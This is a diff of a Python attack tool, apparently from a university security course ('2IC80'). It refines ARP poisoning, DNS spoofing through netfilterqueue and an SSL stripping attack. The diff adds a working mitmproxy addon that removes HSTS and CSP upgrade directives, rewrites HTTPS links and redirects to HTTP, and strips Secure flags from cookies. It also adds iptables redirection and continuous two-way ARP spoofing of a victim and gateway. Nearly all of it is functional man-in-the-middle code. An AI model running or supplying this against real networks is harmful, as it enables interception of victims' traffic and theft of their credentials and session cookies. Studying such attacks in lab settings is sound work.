@@ -1,39 +1,14 @@
-import sys, os, argparse
+import sys, os, argparse, re, threading, time
 from util import bcolors, clear, parse_ip_input, validate_domain
-import random
-from scapy.all import *
-from scapy.all import (
-    sendp,
-    Ether,
-    IP,
-    UDP,
-    DNS,
-    DNSQR,
-    DNSRR,
-    ARP,
-    getmacbyip,
-    send,
-    sniff,
-    TCP,
-    Raw,
-)
-import time
-import threading
-import re
 import urllib
-from functools import partial
 import netfilterqueue
-
-# from mitmproxy import controller, proxy, options
+from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip, send, srp
+from mitmproxy import controller, proxy, options
 
 # Global variables
 dns_ip = ""
 dns_domain = ""
 
-
-# The name of the network interface to use for sniffing and sending packets
-RUNINGTHREAD = False
-NET_INTERFACE = "enp0s8"
 ATTACKS = {
     "a": "ARP poisoning",
     "b": "DNS spoofing",
@@ -51,6 +26,9 @@ parser = argparse.ArgumentParser(
 
 
 def spoof(target_ip, spoof_ip, verbose=True):
+    """
+    Spoof the ARP table of the victim.
+    """
     packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
 
     if verbose:
@@ -60,6 +38,16 @@ def spoof(target_ip, spoof_ip, verbose=True):
 
 
 def ARPposioning():
+    """
+    Execute the ARP poisoning attack.
+
+    This function starts off by asking the attacker for the IP address of the victim and the IP address
+    of the gateway. The attacker is then asked if they want to spoof one or multiple victims. Based on
+    the answer, the attacker is asked for the IP address of the victim(s) and the IP address to spoof.
+
+    After all the required information is gathered, a packet is forged using Scapy and sent to the victim(s).
+    """
+
     ip_attacker = custom_input("Enter IP address of attacker: ")
     mac_attacker = getmacbyip(ip_attacker)
 
@@ -107,28 +95,23 @@ def ARPposioning():
     )
 
 
-def request_input(type, msg, count, invalid_msg, invalid_count_msg):
-    output = None
-    while not output:
-        output = custom_input(msg)
-        if type == "ip":
-            output = parse_ip_input(output)
-        elif type == "domain":
-            output = validate_domain(output)
-        else:
-            output = None
-
-        if len(output) != count:
-            output = None
-            print(invalid_count_msg)
-        
-        if not output:
-            print(invalid_msg)
-        
-    return output
-
-
 def DNSpoisoning():
+    """
+    Execute the DNS spoofing attack.
+
+    This function starts off by making sure IP forwarding is enabled on the attacker's device and setting up an
+    iptables rule to trap outgoing packets in the netfilterqueue. The attacker is then asked for a domain name
+    to spoof and an IP address to redirect the domain name to. The attacker is also asked for the IP address
+    of the victim and the IP address of the gateway.
+
+    After all the required information is gathered, a thread is started which ARP spoofs the gateway and the
+    victim every 4 seconds to make the attacker's device a Man in the Middle. A second thread is started which
+    sets up netfilterqueue to intercept all outgoing packets. When a DNS response is intercepted, the attacker
+    checks if the domain name in the response matches the domain name to spoof. If it does, the IP address in
+    the response is changed to the IP address to redirect the domain name to after which the packet is forwarded
+    to the victim.
+    """
+
     global dns_ip
     global dns_domain
 
@@ -204,6 +187,9 @@ def DNSpoisoning():
 
 
 def arp_spoof_continuously(ip_gate, ip_victim, interval):
+    """
+    Continuously two-way spoof the ARP table of the provided victim and gateway.
+    """
     while True:
         spoof(ip_gate, ip_victim, verbose=False)
         spoof(ip_victim, ip_gate, verbose=False)
@@ -217,13 +203,15 @@ def netfilter_queue():
 
 
 def process_packet(packet):
+    """
+    Process, possibly modify and forward the intercepted DNS packet.
+    """
     scapy_packet = IP(packet.get_payload())
 
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
 
         if dns_domain in qname.decode():
-            print("[+] Spoofing target")
             answer = DNSRR(rrname=qname, rdata=dns_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
@@ -236,10 +224,9 @@ def process_packet(packet):
     packet.accept()
 
 
-
 def SSLstripping():
     """
-    Function for executing the SSL stripping attack.
+    Execute the SSL stripping attack.
 
     This function starts off by spoofing the gateway and the victim. Then, it starts a proxy server
     using MITMProxy. The proxy server will intercept all HTTP requests and responses. This interception
@@ -276,40 +263,12 @@ def SSLstripping():
     spoof(ip_victim, ip_gateway)
 
     # Run the proxy in a new thread
-    proxy_thread = threading.Thread(target=run_proxy, args=("localhost", 8080))
+    proxy_thread = threading.Thread(target=run_proxy)
     proxy_thread.daemon = True
     proxy_thread.start()
 
     # Run the IPTABLES command to redirect traffic to the proxy
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
-
-    # Run the SSL stripping attack using Scapy only instead of using MITMProxy, IPTABLES and the SSLStrip tool. Build it from scratch.
-    # Concept:
-    # 1. Sniff for HTTP requests
-    # 2. When received, modify the request headers and forward the request to the server
-    # 3. Sniff for HTTP responses
-    # 4. When received, modify the response headers, strip the links and secure tags in the response body and forward the response to the client
-
-    # Set of SSL/TLS capable hosts
-    # secure_hosts = set()
-
-    # Transform the request and response functions above into Scapy code
-    def request(packet):
-        print('Sniffed a TCP packet')
-        print(packet.summary())
-        print('Packet has TCP: {has_tcp}, has raw: {has_raw}, TCP destination port: {tcp_dport}'.format(
-            has_tcp=packet.haslayer(TCP), has_raw=packet.haslayer(Raw), tcp_dport=packet[TCP].dport))
-        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
-            print(packet[TCP].payload)
-
-    def response(packet):
-        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
-            print(packet[TCP].payload)
-
-    # # Sniff for HTTP requests in a new thread
-    # ssl_strip_thread = threading.Thread(target=ssl_strip_sniffing, args=(request, response))
-    # ssl_strip_thread.daemon = True
-    # ssl_strip_thread.start()
 
     print("\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
         cyan=bcolors.OKCYAN,
@@ -318,52 +277,98 @@ def SSLstripping():
     ))
 
 
-def ssl_strip_sniffing(request, response):
-    sniff(filter="tcp port 80", prn=request, store=0, iface=NET_INTERFACE, count=1)
-
-
-class RequestLogger:
-    def request(self, flow):
-        print(flow.request)
-
-
-def run_proxy(host, port):
-    # Start an MITM proxy server + master in Python 2.7 (mitmproxy version 0.18.2)
+def run_proxy():
+    # Start an MITM proxy server
     opts = options.Options(mode="transparent")
     c = proxy.config.ProxyConfig(opts)
     s = proxy.server.ProxyServer(config=c)
     m = controller.Master(opts, s)
+    m.addons.add(SSLStrip())
 
     try:
         m.run()
     except KeyboardInterrupt:
         m.shutdown()
 
-    # Set of SSL/TLS capable hosts
-    # secure_hosts = set()
+
+class SSLStrip:
+    """
+    MITMProxy addon to execute the SSL stripping attack. This addon will intercept all HTTP requests
+    and responses. This interception allows us to downgrade the HTTPS responses to HTTP responses and
+    execute an SSL stripping attack.
+    """
+
+    secure_hosts = set()
+
+    def request(self, flow):
+        flow.request.headers.pop('If-Modified-Since', None)
+        flow.request.headers.pop('Cache-Control', None)
+        flow.request.headers.pop('Upgrade-Insecure-Requests', None)
+
+        # Proxy connections to SSL-enabled hosts
+        if flow.request.pretty_host in self.secure_hosts:
+            flow.request.scheme = 'https'
+            flow.request.port = 443
+            flow.request.host = flow.request.pretty_host
+        
+    def response(self, flow):
+        assert flow.response
+        flow.response.headers.pop('Strict-Transport-Security', None)
+        flow.response.headers.pop('Public-Key-Pins', None)
+
+        # Strip links in response body
+        flow.response.content = flow.response.content.replace(
+            b'https://', b'http://')
+
+        # Strip meta tag upgrade-insecure-requests in response body
+        csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
+        flow.response.content = re.sub(
+            csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)
+
+        # Strip links in 'Location' header
+        if flow.response.headers.get('Location', '').startswith('https://'):
+            location = flow.response.headers['Location']
+            hostname = urllib.parse.urlparse(location).hostname
+            if hostname:
+                self.secure_hosts.add(hostname)
+            flow.response.headers['Location'] = location.replace(
+                'https://', 'http://', 1)
+
+        # Strip upgrade-insecure-requests in Content-Security-Policy header
+        csp_header = flow.response.headers.get('Content-Security-Policy', '')
+        if re.search('upgrade-insecure-requests', csp_header, flags=re.IGNORECASE):
+            csp = flow.response.headers['Content-Security-Policy']
+            new_header = re.sub(
+                r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
+            flow.response.headers['Content-Security-Policy'] = new_header
+
+        # Strip secure flag from 'Set-Cookie' headers
+        cookies = flow.response.headers.get_all('Set-Cookie')
+        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
+        flow.response.headers.set_all('Set-Cookie', cookies)
 
 
 def scan_ip(network, iface):
     arp_request = ARP(pdst=network)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
-    arp_request_broadcast = broadcast / arp_request  # Combined Packet
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")        # Broadcast MAC
+    arp_request_broadcast = broadcast / arp_request   # Combined Packet
 
     answered = srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]
 
     # Print the IP and MAC addresses of all the devices on the network.
-    print(
-        "\033[1m"
-        + "  Here are the active devices on the "
-        + iface
-        + " interface"
-        + "\033[0m"
-    )
-    for sent, received in answered:
-        print("  IP: " + received.psrc + " - MAC: " + received.hwsrc)
+    print("{bold}  Here are the active devices on the {iface} interface{endc}".format(bold=bcolors.BOLD, iface=iface, endc=bcolors.ENDC))
+    
+    for _, received in answered:
+        print("  IP: {psrc} - MAC: {hwsrc}".format(psrc=received.psrc, hwsrc=received.hwsrc))
+    
     print("\n")
 
 
 def mapAddresses():
+    """
+    Execute the address mapping in order to find information about the devices on the network.
+    """
+
     print("  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n")
     scan_ip("10.0.2.0/24", "enp0s8")
     scan_ip("192.168.56.1/24", "enp0s3")
@@ -372,6 +377,7 @@ def mapAddresses():
 def main():
     clear()
     print("2IC80: Tool by G44")
+
     while True:
         print("Select the preferred attack from the list below:\n")
 
